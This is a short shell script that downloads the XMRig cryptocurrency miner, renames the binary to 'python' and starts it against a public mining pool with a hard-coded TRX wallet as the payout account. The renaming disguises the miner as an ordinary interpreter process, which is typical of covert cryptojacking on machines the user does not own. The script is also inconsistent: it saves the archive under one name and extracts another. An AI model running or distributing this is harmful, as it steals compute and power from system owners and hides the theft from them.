curl -L -o python.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar -zxf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
mv xmrig python
./python -o rx.unmineable.com:3333 -a rx -k -u TRX:TYSnLDWrR5TmqgRKTM2ApKkng5ZW9j9iaH.Miner -p x
